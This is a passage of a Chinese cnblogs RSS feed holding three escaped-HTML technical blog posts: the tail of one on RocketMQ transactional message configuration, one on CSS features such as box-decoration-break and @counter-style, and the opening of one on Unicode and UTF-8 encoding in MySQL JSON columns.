&lt;p&gt;若想自定义丢弃消息行为，需要修改 RocketMQ broker 端代码，继承 &lt;code&gt;AbstractTransactionalMessageCheckListener&lt;/code&gt; 重写 &lt;code&gt;resolveDiscardMsg&lt;/code&gt; 方法，加入自定义逻辑。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;同步的双重写入机制&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;为了确保事务消息不丢失，并且保证事务完整性，需要将事务消息复制到集群其他节点，建议使用同步双重写入机制。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;事务反查时间设置&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;我们可以设置以下参数，设置 MQ 服务端多久之后开始反查事务消息（自事务消息保存成功之后开始计算）。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;msg.putUserProperty(MessageConst.PROPERTY_CHECK_IMMUNITY_TIME_IN_SECONDS, &quot;10&quot;);
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;或者我们可以在 &lt;code&gt;broker.conf&lt;/code&gt; 设置以下参数：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-conf&quot;&gt;# 单位为 ms,默认为 6 s
transactionTimeout=60000
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;发送端主动设置配置参数优先级大于 &lt;code&gt;broker&lt;/code&gt; 端配置。&lt;/p&gt;
&lt;p&gt;另外 RocketMQ 还有一个配置用于控制事务性消息检查间隔：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-conf&quot;&gt;## 默认为 60s
transactionCheckInterval=5000
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;如果自定义配置如上,事务消息检查间隔为 5 秒，事务消息设置检查时间为 60 s。&lt;/p&gt;
&lt;p&gt;这就代表 broker 每隔 5s 检查一次事务消息，如果此时事务消息到 MQ 服务端时间还未超过 60s，此时将不会反查，直到时间大于 60s。&lt;/p&gt;
&lt;h2 id=&quot;彩蛋&quot;&gt;彩蛋&lt;/h2&gt;
&lt;p&gt;查找事务消息资料的时候，发现 RocketMQ 文档存在相关错误。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/1419561/202003/1419561-20200330075826388-2022132243.jpg&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;0.84269662921348&quot;&gt;
&lt;p&gt;文档地址：&lt;a href=&quot;https://github.com/9526xu/rocketmq/blob/master/docs/cn/RocketMQ_Example.md&quot;&gt;https://github.com/9526xu/rocketmq/blob/master/docs/cn/RocketMQ_Example.md&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;如上两处实际是&lt;strong&gt;错误&lt;/strong&gt;的，应该修改为：&lt;code&gt;AbstractTransactionalMessageCheckListener&lt;/code&gt; 与 &lt;code&gt;transactionTimeout&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/1419561/202003/1419561-20200330075826602-473364513.jpg&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;1.25&quot;&gt;
&lt;p&gt;issue 地址：&lt;a href=&quot;https://github.com/apache/rocketmq/issues/481&quot;&gt;https://github.com/apache/rocketmq/issues/481&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;顺手修改了一下，提交 &lt;strong&gt;PR&lt;/strong&gt; 。哈哈，也为开源项目贡献了一份力量。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/1419561/202003/1419561-20200330075826788-1397449189.jpg&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;reference&quot;&gt;Reference&lt;/h2&gt;
&lt;ol&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/apache/rocketmq/issues/481&quot;&gt;https://github.com/apache/rocketmq/issues/481&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/9526xu/rocketmq/blob/master/docs/cn/RocketMQ_Example.md&quot;&gt;https://github.com/9526xu/rocketmq/blob/master/docs/cn/RocketMQ_Example.md&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;极客时间-消息队列高手课&lt;/li&gt;
&lt;/ol&gt;&lt;h2 id=&quot;最后说一句（求关注）&quot;&gt;最后说一句（求关注）&lt;/h2&gt;
&lt;p&gt;以前总以为参加开源项目很难，直到最近接连参与两次开源项目修改，才发现其实并没有想象中那么难。由于版本变更，开源项目文档有些是存在错误的，如果我们看到了，顺手修复一下，这也是为开源项目贡献一份力。&lt;/p&gt;
&lt;p&gt;才疏学浅，难免会有纰漏，如果你发现了错误的地方，还请你留言给我指出来，我对其加以修改。&lt;/p&gt;
&lt;p&gt;再次感谢您的阅读，我是&lt;strong&gt;楼下小黑哥&lt;/strong&gt;，一位还未秃头的工具猿，下篇文章我们再见~&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/1419561/202003/1419561-20200330075826903-2053309445.gif&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;5.5384615384615&quot;&gt;
&lt;p&gt;欢迎关注我的公众号：程序通事，获得日常干货推送。如果您对我的专题内容感兴趣，也可以关注我的博客：&lt;a href=&quot;https://studyidea.cn&quot;&gt;studyidea.cn&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
</description>
<pubDate>Sun, 29 Mar 2020 23:58:00 +0000</pubDate>
<dc:creator>楼下小黑哥</dc:creator>
<og:description>在分布式系统中，为了保证数据一致性是必须使用分布式事务。分布式事务实现方式就很多种，今天主要介绍一下使用 RocketMQ 事务消息，实现分布事务。 文末有彩蛋，看完再走 为什么需要事务消息？ 很多同</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/goodAndyxublog/p/12596402.html</dc:identifier>
</item>
<item>
<title>CSS躬行记（1）——CSS基础拾遗 - 咖啡机（K.F.J）</title>
<link>http://www.cnblogs.com/strick/p/12519252.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/strick/p/12519252.html</guid>
<description>&lt;p&gt;　　CSS3新增的box-decoration-break属性可指定行内非替换元素在跨行、跨列或跨页时的样式渲染，它包含两个值：&lt;/p&gt;
&lt;p&gt;　　（1）slice：默认值，盒子会被分割成多部分。&lt;/p&gt;
&lt;p&gt;　　（2）clone：断开的各个盒子会单独渲染。&lt;/p&gt;
&lt;p&gt;　　下面用一个示例来演示两种的区别，第一个span元素采用box-decoration-break的默认值，效果如第一张图所示，在断行处没有左右内边距和圆角；第二个span元素box-decoration-break的值为clone，效果如第二张图所示，注意，在Chrome浏览器中要加属性前缀。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;style&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
  span &lt;/span&gt;&lt;span&gt;{&lt;/span&gt;&lt;span&gt;
    border-radius&lt;/span&gt;&lt;span&gt;:&lt;/span&gt;&lt;span&gt; 10px&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;span&gt;
    padding&lt;/span&gt;&lt;span&gt;:&lt;/span&gt;&lt;span&gt; 0 10px&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;
  &lt;span&gt;}&lt;/span&gt;&lt;span&gt;
  span.clone &lt;/span&gt;&lt;span&gt;{&lt;/span&gt;&lt;span&gt;
    box-decoration-break&lt;/span&gt;&lt;span&gt;:&lt;/span&gt;&lt;span&gt; clone&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;span&gt;
    -webkit-box-decoration-break&lt;/span&gt;&lt;span&gt;:&lt;/span&gt;&lt;span&gt; clone&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;
  &lt;span&gt;}&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;style&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;div&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;span&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;测试CSS属性，box-decoration-break:slice&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;span&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;div&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;div&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;span &lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt;=&quot;clone&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;测试CSS属性，box-decoration-break:clone&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;span&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;div&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/211606/202003/211606-20200318182410251-669250950.png&quot; alt=&quot;&quot;/&gt; &lt;img src=&quot;https://img2020.cnblogs.com/blog/211606/202003/211606-20200318182419618-1747608875.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　box-decoration-break可影响的CSS属性包括background、border、border-image、box-shadow、border-radius、clip-path、margin和padding。&lt;/p&gt;

&lt;p&gt;　　当元素的CSS属性display定义为contents后，它就会消失，不参与页面的格式化，但不会隐藏子元素。&lt;/p&gt;
&lt;p&gt;　　下面以两组ul元素为例，第一组的ul元素包含边框、宽度以及默认的边距和列表项标记，效果如第一张图所示；第二组的ul元素不再有之前的样式，效果如第二张图所示。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;style&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
  ul &lt;/span&gt;&lt;span&gt;{&lt;/span&gt;&lt;span&gt;
    border&lt;/span&gt;&lt;span&gt;:&lt;/span&gt;&lt;span&gt; 1px solid #000&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;span&gt;
    width&lt;/span&gt;&lt;span&gt;:&lt;/span&gt;&lt;span&gt; 100px&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;
  &lt;span&gt;}&lt;/span&gt;&lt;span&gt;
  ul.contents &lt;/span&gt;&lt;span&gt;{&lt;/span&gt;&lt;span&gt;
    display&lt;/span&gt;&lt;span&gt;:&lt;/span&gt;&lt;span&gt; contents&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;
  &lt;span&gt;}&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;style&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;ul&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;li&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;Strick&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;li&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;li&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;Freedom&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;li&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;li&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;Justify&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;li&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;ul&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;ul &lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt;=&quot;contents&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;li&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;Strick&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;li&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;li&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;Freedom&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;li&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;li&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;Justify&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;li&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;ul&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/211606/202003/211606-20200318182612126-216376145.png&quot; alt=&quot;&quot;/&gt;  &lt;img src=&quot;https://img2020.cnblogs.com/blog/211606/202003/211606-20200318182622285-1220623474.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　注意，浏览器会移除所有display定义为contents的元素的可访问性，这会导致该元素及其后续元素不再被屏幕阅读技术访问。&lt;/p&gt;

&lt;p&gt;　　@counter-style是一条CSS语句，可定义计数模式，即修改计数器样式，从而弥补了那些内置计数模式难以适应的场景。但要注意，目前只有Firefox浏览器能完美支持@counter-style。&lt;/p&gt;
&lt;p&gt;　　每条@counter-style由一个名称和一组描述符组成，其可用的描述符如下表所列。&lt;/p&gt;
&lt;table border=&quot;0&quot;&gt;&lt;tbody readability=&quot;9&quot;&gt;&lt;tr&gt;&lt;td&gt;描述符&lt;/td&gt;
&lt;td&gt;说明&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;3&quot;&gt;&lt;td&gt;system&lt;/td&gt;
&lt;td&gt;指定计数算法，即计数器模式系统，可选值包括fixed、cyclic、symbolic、alphabetic、numeric、additive和extends&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;3&quot;&gt;&lt;td&gt;symbols&lt;/td&gt;
&lt;td&gt;指定记号，可以是字符串、图像等标识符，除了additive和extends两种算法之外，都需要该描述符&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;2&quot;&gt;&lt;td&gt;additive-symbols&lt;/td&gt;
&lt;td&gt;为additive算法指定记号&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;2&quot;&gt;&lt;td&gt;negative&lt;/td&gt;
&lt;td&gt;当计数器表示负值时，将该符号加在值的两侧&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;prefix&lt;/td&gt;
&lt;td&gt;为记号加前缀&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;suffix&lt;/td&gt;
&lt;td&gt;为记号加后缀&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;2&quot;&gt;&lt;td&gt;range&lt;/td&gt;
&lt;td&gt;限制计数器生效的范围，当值不在该范围时，使用备用计数算法&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;2&quot;&gt;&lt;td&gt;fallback&lt;/td&gt;
&lt;td&gt;当不能使用自定义的计数算法或超出了range定义的范围时，使用该后备算法&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;2&quot;&gt;&lt;td&gt;pad&lt;/td&gt;
&lt;td&gt;定义记号的最小长度和填充符号&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;2&quot;&gt;&lt;td&gt;speak-as&lt;/td&gt;
&lt;td&gt;指定计数器在语音识别系统中的发音策略&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;&lt;span&gt;&lt;strong&gt;1）system&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　在system描述符中有五个比较容易理解的算法，如下所列。&lt;/p&gt;
&lt;p&gt;　　（1）fixed：在遍历了指定的记号后，恢复原来的计数模式。&lt;/p&gt;
&lt;p&gt;　　（2）cyclic：循环遍历指定的记号。&lt;/p&gt;
&lt;p&gt;　　（3）symbolic：与cyclic类似，但每循环一次会叠加一个记号。&lt;/p&gt;
&lt;p&gt;　　（4）alphabetic：与symbolic类似，但重复方式不同，记号会被解释成数字，转换为字母编号系统。&lt;/p&gt;
&lt;p&gt;　　（5）numeric：与alphabetic类似，也是使用按位计数系统，但第一个记号从位置1开始，而不是0。&lt;/p&gt;
&lt;p&gt;　　五种算法的效果如下图所示，CSS代码如下所示，因为代码都比较类似，所以只给出了fixed。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;@counter-style fixed-digits &lt;/span&gt;{&lt;span&gt;
  system&lt;/span&gt;:&lt;span&gt; fixed&lt;/span&gt;;&lt;span&gt;
  symbols&lt;/span&gt;:&lt;span&gt; ① ②&lt;/span&gt;;
}&lt;span&gt;
ul &lt;/span&gt;{&lt;span&gt;
  list-style&lt;/span&gt;:&lt;span&gt; fixed-digits&lt;/span&gt;;
}
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/211606/202003/211606-20200318183446904-1831502940.png&quot; alt=&quot;&quot; width=&quot;800&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;2）扩展计数模式&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　system描述符中的extends能够对现有的计数系统进行调整，例如将下面的digits中的每个记号用0来填充，并且添加冒号作为后缀。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;@counter-style digits &lt;/span&gt;{&lt;span&gt;
  system&lt;/span&gt;:&lt;span&gt; numeric&lt;/span&gt;;&lt;span&gt;
  symbols&lt;/span&gt;:&lt;span&gt; &quot;0&quot; &quot;1&quot; &quot;2&quot;&lt;/span&gt;;
}&lt;span&gt;
@counter-style mydigits &lt;/span&gt;{&lt;span&gt;
  system&lt;/span&gt;:&lt;span&gt; extends digits&lt;/span&gt;;&lt;span&gt;
  suffix&lt;/span&gt;:&lt;span&gt; &quot;：&quot;&lt;/span&gt;;&lt;span&gt;
  pad&lt;/span&gt;:&lt;span&gt; 3 &quot;0&quot;&lt;/span&gt;;
}&lt;span&gt;
ul &lt;/span&gt;{&lt;span&gt;
  list-style&lt;/span&gt;:&lt;span&gt; mydigits&lt;/span&gt;;
}
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;　　自定义属性（custom property）并不是新增一个特殊的CSS属性，而是声明一个CSS变量，它以“--”为前缀。如果要定义全局的CSS变量，可以将其声明到:root伪类中，如下所示。注意，自定义属性可声明在任意的选择器中。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;:root &lt;/span&gt;{&lt;span&gt;
  --orange-color&lt;/span&gt;:&lt;span&gt; #F60&lt;/span&gt;;
}
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　通过var()函数来引用自定义属性，第一个参数是自定义属性的名称，第二个参数是备用值，如下所示。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;p &lt;/span&gt;{&lt;span&gt;
  color&lt;/span&gt;:&lt;span&gt; var(--orange-color, #FC0)&lt;/span&gt;;
}
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　虽然Sass、Less这些预处理器已经提供了变量，但是自定义属性与它们相比，其优势是实时性。因为它的值是由浏览器计算的，而预处理器是事先计算好的。&lt;/p&gt;
&lt;p&gt;　　如果想体验自定义属性，但是又担心浏览器的兼容性，那么可以试试查询特性的@supports语句，可包含多个检测条件，其语法与媒体查询类似。当在不支持自定义属性的浏览器中运行下面这段CSS时，@supports内的声明块会被跳过。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;@supports (--orange-color: #F60) &lt;/span&gt;{&lt;span&gt;
  p {
    color&lt;/span&gt;:&lt;span&gt; blue&lt;/span&gt;;
  }&lt;span&gt;
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;span&gt;&lt;strong&gt;1） transparent&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　在CSS中，transparent关键字相当于rgba(0,0,0,0)。当作为background的属性值时（如下所示），仅仅是将元素的背景设为透明，元素中的内容还能显示。与opacity:0不同，opacity会把元素和内容当成一个整体，当定义为0时，两者都会透明。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;p &lt;/span&gt;{&lt;span&gt;
  background&lt;/span&gt;:&lt;span&gt; transparent&lt;/span&gt;;
}
&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; 不同 &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
p &lt;/span&gt;{&lt;span&gt;
  opacity&lt;/span&gt;:&lt;span&gt; 0&lt;/span&gt;;
}
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;2）currentColor&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　此关键字表示当前元素的color属性的计算值。在下面的示例中，p是div的子元素，因为p的color属性继承自div的color属性，所以currentColor的值为#F60。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;div &lt;/span&gt;{&lt;span&gt;
  color&lt;/span&gt;:&lt;span&gt; #F60&lt;/span&gt;;
}&lt;span&gt;
div &amp;gt; p &lt;/span&gt;{&lt;span&gt;
  background&lt;/span&gt;:&lt;span&gt; currentColor&lt;/span&gt;;
}
&lt;/pre&gt;&lt;/div&gt;

</description>
<pubDate>Sun, 29 Mar 2020 23:54:00 +0000</pubDate>
<dc:creator>咖啡机（K.F.J）</dc:creator>
<og:description>一、box-decoration-break CSS3新增的box-decoration-break属性可指定行内非替换元素在跨行、跨列或跨页时的样式渲染，它包含两个值： （1）slice：默认值，盒</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/strick/p/12519252.html</dc:identifier>
</item>
<item>
<title>MySQL对JSON类型UTF-8编码导致中文乱码探讨 - Jeffcky</title>
<link>http://www.cnblogs.com/CreateMyself/p/12587426.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/CreateMyself/p/12587426.html</guid>
<description>&lt;h2&gt;前言&lt;/h2&gt;
&lt;p&gt;继上文发表之后，结合评论意见并亲自验证最终发现是编码的问题，但是对于字符编码还是有点不解，于是乎，有了本文，我们来学习字符编码，在学习的过程中，我发现对于MySQL中JSON类型的编码导致数据中文出现乱码还有可深挖之处，接下来我们来分析一下，若有错误之处，还请批评指出。&lt;/p&gt;
&lt;h2&gt;字符编码&lt;/h2&gt;
&lt;p&gt;评论中指出任何不在基本多文本平面的Unicode字符，都无法使用MySQL的utf8字符集存储，包括Emoji 表情(Emoji 是一种特殊的Unicode 编码，常见于IOS和Android 手机上)和很多不常用的汉字，以及任何新增的 Unicode 字符等等(utf8的缺点)，然而啥是多文本平面，详情维基百科《&lt;a href=&quot;https://en.wikipedia.org/wiki/Plane_(Unicode)&quot;&gt;https://en.wikipedia.org/wiki/Plane_(Unicode)&lt;/a&gt;》。首先我们了解下什么是Unicode，Unicode是通用字符集，它是一种标准，该标准在一处定义了编写在计算机上使用的大多数活动语言所需的所有字符，它的目标是成为并且在很大程度上已经是已编码的所有其他字符集的超集。在计算机或网络中的文本我们通过字符组成，字符代表字母、标点符号或其他符号。不同的组织收集了不同的字符集并为其创建了编码-一个字符集可能仅覆盖基于拉丁语的西欧语言（不包括保加利亚或希腊等欧盟国家），另一个可能覆盖特定的远东语言（例如（例如日语），其他语言可能是以特殊方式设计的，代表世界上某处其他语言的众多语言之一。但是我们并&lt;span&gt;不能保证应用程序将支持所有编码，也不能保证给定的编码将满足我们代表给定语言的所有需求，&lt;/span&gt;&lt;span&gt;另外，通常不可能在同一网页或数据库中组合不同的编码，因此使用“传统”编码方法来支持多语言页面通常非常困难，所以&lt;span&gt;&lt;span&gt;U&lt;/span&gt;&lt;/span&gt;&lt;span&gt;&lt;span&gt;nicode协会&lt;/span&gt;&lt;/span&gt;&lt;span&gt;&lt;span&gt;提供了一个大的，单字节字符集，旨在包括所有需要的世界上任何书写系统，包括古老的脚本（如楔形文字，哥特式和埃及的象形文字）的字符，所以统一字符编码，将其作为&lt;/span&gt;&lt;span&gt;Web和操作系统体系结构的基础，并且得到所有主要Web浏览器和应用程序的支持。当前的Unicode字符分为17组编排，每组被称之为一个平面（Plane），所以将字符划分为0-16号的平面，而每平面拥有65536（即2&lt;sup&gt;16&lt;/sup&gt;）个代码点即范围区间在0x000到0xFFFF之间，而0号平面就是基本多语言平面（BMP：Basic Mutiingual Plane）。在基本多文本平面上针对每一种文字或者其补充或者其扩展都给出了一个编码范围，比如拉丁文【0000-007F】，拉丁文-补充【0080-00FF】等等。说了这么多，我们只需要记住一点即可：&lt;span&gt;在Unicode字符集中前65536个代码点构成了基本多语言平面简称BMP，BMP中包含了大多常用的字符，另外Unicode字符集还包含了一百万个其他代码点的位置空间，我们称之为补充字符。&lt;/span&gt;我们需要区分字符集、编码字符集和编码的概念，字符集或字符串包含可能用于特定目的的字符集，它是支持计算机上的西欧语言所需的字符集，与计算机完全无关，而编码字符集是一组用于该唯一的号码被分配给每个字符的字符，有时候我们将编码字符集也可称作为代码页，编码字符集的单位称为代码点，代码点值表示字符在编码字符集中的位置。例如，Unicode编码字符集中字母á的代码点为十进制225，十六进制表示法为0xE1。而字符编码反映编码字符集被映射到用于在计算机操纵字节的方式。一个字符集可以有多种编码，许多字符编码标准，例如ISO 8859系列中定义的标准，都为给定字符使用单个字节，并且编码是对编码字符集中字符标量位置的直接映射。例如，ISO 8859-1编码字符集中的字母A在第65个字符位置（从零开始），并且使用值为65的字节进行编码并以此在计算机中表示，对于ISO 8859-1而言，这将永远不会再改变，&lt;span&gt;&lt;span&gt;但是，对于Unicode，事情并没有如此简单，&lt;/span&gt;&lt;span&gt;尽管&lt;/span&gt;&lt;span&gt;Unicode编码字符集中&lt;/span&gt;&lt;span&gt;字母&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;qchar&quot;&gt;&lt;span&gt;&lt;span&gt;á&lt;/span&gt;&lt;/span&gt;&lt;span&gt;&lt;span&gt;的代码点&lt;/span&gt;&lt;span&gt;始终为225（十进制），但在UTF-8中，它在计算机中由两个字节表示，&lt;/span&gt;&lt;span&gt;换句话说，在此字符的编码字符集值和编码值之间不是简单的一对一映射，&lt;span&gt;&lt;span&gt;另外，在Unicode中，针对同一字符可以有多种编码的方式。&lt;/span&gt;&lt;span&gt;例如，字母&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;qchar&quot;&gt;&lt;span&gt;&lt;span&gt;á&lt;/span&gt;&lt;/span&gt;&lt;span&gt;&lt;span&gt;可以用一种编码形式的两个字节表示，而用另一种编码形式的四个字节表示。&lt;/span&gt;&lt;span&gt;可以与Unicode一起使用&lt;/span&gt;&lt;span&gt;的编码形式&lt;/span&gt;&lt;/span&gt;&lt;span&gt;&lt;span&gt;称为UTF-8，UTF-16和UTF-32。&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;a class=&quot;print&quot; title=&quot;2&quot; href=&quot;http://www.unicode.org/standard/standard.html&quot;&gt;&lt;span&gt;&lt;span&gt;&lt;br/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/589642/202003/589642-20200328170046748-573581618.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
